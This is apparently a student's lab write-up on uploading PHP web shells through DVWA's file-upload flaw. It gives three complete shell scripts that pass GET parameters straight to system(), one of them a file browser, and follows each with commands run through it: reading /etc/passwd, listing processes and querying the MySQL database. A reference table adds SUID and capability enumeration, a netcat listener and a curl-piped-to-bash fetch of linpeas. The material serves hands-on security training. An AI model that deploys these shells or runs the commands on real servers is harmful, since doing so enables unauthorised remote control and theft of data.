# Reverse Shell
---



# Shell PHP File Upload


## What is file upload Shell PHP?
PHP shell is a small PHP script that gives an attacker interactive control over a web server via HTTP, typically allowing them to run commands, browse files, upload/download, and pivot. It’s malicious when used without authorization, but understanding them is essential for defending systems and learning secure coding.





# PHP Shell File Methodology

- In this i test with `DVWA`: http://192.168.100.97:8080/vulnerabilities/upload/
<img width="808" height="639" alt="image" src="https://github.com/user-attachments/assets/039d1a5a-94ee-430d-a2b4-49b897158682" />


---


## Basic PHP Shell
- In kali:
````
sudo mousepad basic_shell.php
````
````
<?php
if(isset($_GET['cmd'])) {
    echo "<h3>Command: " . $_GET['cmd'] . "</h3>";
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "PHP Shell is active. Use ?cmd=command to execute commands.";
}
?>
````
````
sudo chmod +x basic_shell.php
````
<img width="412" height="195" alt="image" src="https://github.com/user-attachments/assets/764fa8ca-2b5a-4e95-8dbe-e374a4c69928" />

### Upload file to target:
<img width="811" height="447" alt="image" src="https://github.com/user-attachments/assets/ae2dadec-9a5e-45f9-aa8f-d96bb25dda62" />

<img width="973" height="841" alt="image" src="https://github.com/user-attachments/assets/f747d8dd-54a3-4c11-a705-bd2d943859c7" />

<img width="805" height="532" alt="image" src="https://github.com/user-attachments/assets/424b3b44-979a-4a84-b3ed-07b240bd521a" />

<img width="806" height="442" alt="image" src="https://github.com/user-attachments/assets/db6eea64-5d9f-48a9-af9e-4af7a24341b5" />

- In this we got successful.

- Go to one more `Tab` in browser and type this: http://192.168.100.97:8080/hackable/uploads/basic_shell.php
<img width="1046" height="231" alt="image" src="https://github.com/user-attachments/assets/57397e93-f2dc-45c2-b84d-e0f442cfb16d" />

#### Options Command that we can use:
| Category                                             | Command / Item                             | Purpose — Meaning                                                                                         | Example / notes                                                                            |                                        |
| ---------------------------------------------------- | ------------------------------------------ | --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ | -------------------------------------- |
| **System Information & Recon**                       | `id`                                       | Show current effective username, UID, GID and groups.                                                     | `id` → `uid=1000(ninon) gid=1000(ninon) groups=...`                                        |                                        |
|                                                      | `whoami`                                   | Print current username.                                                                                   | `whoami` → `ninon`                                                                         |                                        |
|                                                      | `uname -a`                                 | Show kernel, OS, architecture and extra kernel info.                                                      | `uname -a`                                                                                 |                                        |
|                                                      | `cat /etc/passwd`                          | List local system user accounts (no password hashes).                                                     | `cat /etc/passwd`                                                                          |                                        |
|                                                      | `cat /etc/group`                           | List groups and membership.                                                                               | `cat /etc/group`                                                                           |                                        |
|                                                      | `ls -la /home`                             | Show user home directories and permissions.                                                               | `ls -la /home`                                                                             |                                        |
|                                                      | `pwd`                                      | Print working directory (current path).                                                                   | `pwd`                                                                                      |                                        |
|                                                      | `env`                                      | Show environment variables visible to the process.                                                        | `env`                                                                                      |                                        |
|                                                      | (URL-encoding tip)                         | How to pass commands via web-based `cmd` parameters in labs.                                              | `http://.../basic_shell.php?cmd=cat%20/etc/passwd` (encode spaces as `%20`) — **lab only** |                                        |
| **File System Exploration**                          | `ls -la`                                   | List files in current directory including hidden files and permissions.                                   | `ls -la`                                                                                   |                                        |
|                                                      | `find / -type f -name "*.txt" 2>/dev/null` | Find `.txt` files across filesystem, suppress permission errors.                                          | `find / -type f -name "*.txt" 2>/dev/null`                                                 |                                        |
|                                                      | `find / -perm -4000 2>/dev/null`           | Find files with SUID bit set (possible escalation vectors).                                               | `find / -perm -4000 2>/dev/null`                                                           |                                        |
|                                                      | `cd /var/www/html && ls -la`               | Change to web root and list files (inspect site content).                                                 | `cd /var/www/html && ls -la`                                                               |                                        |
|                                                      | `cat /var/www/html/index.php`              | Read website file source to inspect server logic.                                                         | `cat /var/www/html/index.php`                                                              |                                        |
|                                                      | `wget http://example.com/file`             | Download a file from a remote host. **Do not download unknown/malicious files.**                          | `wget http://example.com/file`                                                             |                                        |
|                                                      | `curl -O http://example.com/file`          | Alternative to `wget` for downloading files.                                                              | `curl -O http://example.com/file`                                                          |                                        |
|                                                      | Tip: `cd` + `pwd`                          | Navigate and confirm current directory; some restricted shells limit `cd`.                                | `cd /tmp` then `pwd`                                                                       |                                        |
| **Network & Connection Commands**                    | `ip a` (or `ifconfig`)                     | Display network interfaces and IP addresses. (`ip a` preferred)                                           | `ip a`                                                                                     |                                        |
|                                                      | `netstat -tlnp` (or `ss -tlnp`)            | Show listening TCP ports, numeric addresses, and owning processes.                                        | `netstat -tlnp` or `ss -tlnp`                                                              |                                        |
|                                                      | `ping -c 4 8.8.8.8`                        | Test basic network connectivity (4 pings).                                                                | `ping -c 4 8.8.8.8`                                                                        |                                        |
|                                                      | `nslookup google.com`                      | DNS lookup — resolve hostname to IP.                                                                      | `nslookup example.com`                                                                     |                                        |
|                                                      | `nc -zv 192.168.1.1 22`                    | Use netcat to check whether a port is open (connect scan).                                                | `nc -zv <host> <port>`                                                                     |                                        |
|                                                      | `telnet 192.168.1.1 22`                    | Connect to a TCP port using telnet (if telnet client installed).                                          | `telnet <host> <port>`                                                                     |                                        |
|                                                      | Note: `nc` reverse shells                  | Netcat can open connections or listeners — lab only.                                                      | `nc -lvp 4444` to listen (authorized lab only)                                             |                                        |
| **Privilege Escalation / Enumeration (Non-exploit)** | `sudo -l`                                  | List what commands current user can run as root (sudo privileges).                                        | `sudo -l`                                                                                  |                                        |
|                                                      | `find / -perm -4000 -type f 2>/dev/null`   | Find SUID binaries across filesystem (escalation candidates).                                             | `find / -perm -4000 -type f 2>/dev/null`                                                   |                                        |
|                                                      | `getcap -r / 2>/dev/null`                  | Recursively list file capabilities (Linux capabilities).                                                  | `getcap -r / 2>/dev/null`                                                                  |                                        |
|                                                      | `linpeas.sh`                               | Automated local enumeration script (identifies many misconfigs). **Run only in authorized environments.** | `curl -sS [https://.../linpeas.sh](https://.../linpeas.sh)                                 | bash` (lab only; prefer manual checks) |


---


## After we got successful to file upload:

### Basic Command execution
#### System Information
````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=whoami
````
<img width="1057" height="397" alt="image" src="https://github.com/user-attachments/assets/0128a5fa-6e21-45d6-a500-c58780f71ac0" />


````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=uname -a
````
<img width="1342" height="239" alt="image" src="https://github.com/user-attachments/assets/5676bee8-8e0c-4d8e-aec2-c50d43a91fdf" />


````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=cat /etc/passwd
````
<img width="1346" height="799" alt="image" src="https://github.com/user-attachments/assets/7daeebbb-3f26-499e-a54b-9616e3d211d9" />


````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=cat /etc/issue
````
<img width="1143" height="425" alt="image" src="https://github.com/user-attachments/assets/85c15da2-5d74-4140-acb4-10385ccdafdd" />



#### File System Exploration
````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=ls -la
````
<img width="1346" height="595" alt="image" src="https://github.com/user-attachments/assets/655b488d-20dd-4238-828c-b3609aa517a8" />




#### Network Information
````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=ip addr
````
<img width="1132" height="537" alt="image" src="https://github.com/user-attachments/assets/21996fd2-532c-4a47-9ab6-91b243ae91e8" />



#### Process Information
````
http://192.168.100.97:8080/hackable/uploads/basic_shell.php?cmd=ps aux
````
<img width="1919" height="491" alt="image" src="https://github.com/user-attachments/assets/cd5a4460-0feb-4538-b74f-8e321fa4eb03" />

---




## Advance PHP Shell
````
sudo mousepad advanced_shell.php
````
````
<?php
echo "<h2>PHP Web Shell</h2>";
echo "<form method='GET'>";
echo "<input type='text' name='cmd' size='50' placeholder='Enter command'>";
echo "<input type='submit' value='Execute'>";
echo "</form>";
echo "<hr>";

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<h3>Executing: $cmd</h3>";
    echo "<div style='background: black; color: lime; padding: 10px;'>";
    echo "<pre>";
    
    system($cmd);
    
    echo "</pre>";
    echo "</div>";
}
?>
````
````
sudo chmod +x advanced_shell.php
````
<img width="386" height="178" alt="image" src="https://github.com/user-attachments/assets/06801f97-23c6-4a4a-9e1d-dfea0175a7dc" />

### Upload file on target:
<img width="966" height="527" alt="image" src="https://github.com/user-attachments/assets/1546cb70-a88f-4b59-934f-08b0ba31ce96" />


<img width="976" height="847" alt="image" src="https://github.com/user-attachments/assets/12cb5cf9-a6df-4d75-8e86-59dc720714f8" />

<img width="973" height="523" alt="image" src="https://github.com/user-attachments/assets/9e423409-310b-426c-bbcc-884fe028877f" />

<img width="973" height="523" alt="image" src="https://github.com/user-attachments/assets/208e6c02-b669-40be-aecd-b1c2cd4d9aee" />

- In this we got `Successful`.
<img width="982" height="527" alt="image" src="https://github.com/user-attachments/assets/1d525d5f-49a9-4133-8731-a9e37f5af9e7" />

<img width="1660" height="523" alt="image" src="https://github.com/user-attachments/assets/a242a7ff-622d-4f68-93ba-0c3e385bcbfd" />

- Full `URL`: http://192.168.100.97:8080/hackable/uploads/advanced_shell.php
<img width="1602" height="277" alt="image" src="https://github.com/user-attachments/assets/b18df0bc-4139-4082-9e62-d07a309ed0db" />

<img width="1377" height="305" alt="image" src="https://github.com/user-attachments/assets/f9077549-2cfc-4f12-9c65-982f431bb303" />

- In this we can input command:


#### System Information:
````
whoami
````
<img width="1454" height="390" alt="image" src="https://github.com/user-attachments/assets/50802461-b30f-4083-9467-7d01faae9da8" />

````
uname -a
````
<img width="1177" height="393" alt="image" src="https://github.com/user-attachments/assets/f637a19b-1a42-4685-ab46-9a623bf19661" />


````
ls -la
````
<img width="1345" height="488" alt="image" src="https://github.com/user-attachments/assets/c0a2f0a0-aa16-46f6-8415-a3a16d11f71b" />



- **So this sript PHP is show very good and clean**

---




##  File Manager Shell 
````
sudo mousepad file_manager.php
````
````
<?php
echo "<h2>PHP File Manager</h2>";

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
echo "<h3>Current Directory: " . realpath($current_dir) . "</h3>";

if(isset($_GET['cmd'])) {
    echo "<div style='background: #000; color: #0f0; padding: 10px;'>";
    echo "<strong>Command:</strong> " . $_GET['cmd'] . "<br>";
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    echo "</div>";
}

echo "<h4>Files in directory:</h4>";
echo "<pre>";
$files = scandir($current_dir);
foreach($files as $file) {
    if($file != "." && $file != "..") {
        $filepath = $current_dir . '/' . $file;
        $perms = substr(sprintf('%o', fileperms($filepath)), -4);
        $size = filesize($filepath);
        $type = is_dir($filepath) ? "DIR" : "FILE";
        
        echo "$perms | $type | " . str_pad($size, 10) . " | <a href='?dir=$current_dir&file=$file'>$file</a>\n";
    }
}
echo "</pre>";

if(isset($_GET['file'])) {
    $filepath = $current_dir . '/' . $_GET['file'];
    if(is_file($filepath)) {
        echo "<h4>Content of: " . $_GET['file'] . "</h4>";
        echo "<div style='background: #f0f0f0; padding: 10px;'>";
        highlight_file($filepath);
        echo "</div>";
    }
}
?>
````
````
sudo chmod +x file_manager.php
````
<img width="390" height="169" alt="image" src="https://github.com/user-attachments/assets/63c555fa-6dca-4bea-a7e9-9115b6231d3b" />

### Upload File to target:
<img width="956" height="523" alt="image" src="https://github.com/user-attachments/assets/ec3dda02-262c-4148-b1eb-0bd2678dfb18" />

<img width="976" height="848" alt="image" src="https://github.com/user-attachments/assets/09e63761-f524-4197-8f6c-a2c1b17213ca" />

<img width="952" height="531" alt="image" src="https://github.com/user-attachments/assets/f268547d-508c-4e08-b75f-c33c659a72fc" />

<img width="961" height="527" alt="image" src="https://github.com/user-attachments/assets/a7bcf6fd-eab2-48ad-b7e3-9273a56632b8" />

- So in this we got `Successful` to upload file on target: http://192.168.100.97:8080/hackable/uploads/file_manager.php
<img width="1040" height="443" alt="image" src="https://github.com/user-attachments/assets/7984b65d-2b92-4884-999a-163a385a1886" />



````
http://192.168.100.97:8080/hackable/uploads/file_manager.php?dir=/var/www&file=html
````
<img width="1121" height="298" alt="image" src="https://github.com/user-attachments/assets/d4583f2b-21ea-4741-8d67-a20533deedd8" />


### Database Access
````
http://192.168.100.97:8080/hackable/uploads/file_manager.php?cmd=mysql%20-u%20dvwa%20-p%20dvwa%20-e%20%22SHOW%20TABLES;%22
````
<img width="1238" height="470" alt="image" src="https://github.com/user-attachments/assets/092b1bf5-9bfe-4cba-b4f2-bf4af21c0428" />

---



---

## Finished of PHP Shell

---


---

## Practice By: Nin Kanong (k4n0ng)

### Date: 31/10/2025
---

